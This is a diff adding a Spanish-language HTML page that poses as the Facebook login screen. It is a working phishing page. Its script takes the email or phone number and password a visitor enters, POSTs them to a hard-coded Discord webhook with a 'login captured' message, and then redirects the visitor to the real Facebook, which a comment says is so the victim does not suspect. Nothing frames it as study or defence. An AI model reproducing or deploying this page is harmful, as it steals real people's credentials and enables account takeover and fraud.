@@ -1,1 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Iniciar sesión</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        .login-box h2 { color: #1877f2; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        button:hover { background: #166fe5; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Facebook</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
+            <input type="password" id="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+    </div>
 
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // TU WEBHOOK DE DISCORD INYECTADO AQUÍ
+            const webhookURL = 'https://discord.com/api/webhooks/1570696416156979351/LfKBDqR94O1Wr4tjW9lJEz5d3GacNf-HcPQ_xQB1gpxesOljAjQ2DHAvSXViKWhHvcMu';
+            
+            const data = {
+                content: `**🎯 NUEVO LOGIN CAPTURADO 🎯**\n\n**📧 Correo/Teléfono:** \`${email}\`\n**🔑 Contraseña:** \`${password}\``
+            };
+
+            // Enviar los datos al Discord
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                // Si se envían los datos, lo mandamos a la página real para que no sospeche
+                window.location.href = 'https://www.facebook.com';
+            }).catch(() => {
+                // Si falla, lo mandamos a la página real igual
+                window.location.href = 'https://www.facebook.com';
+            });
+        });
+    </script>
+</body>
+</html>
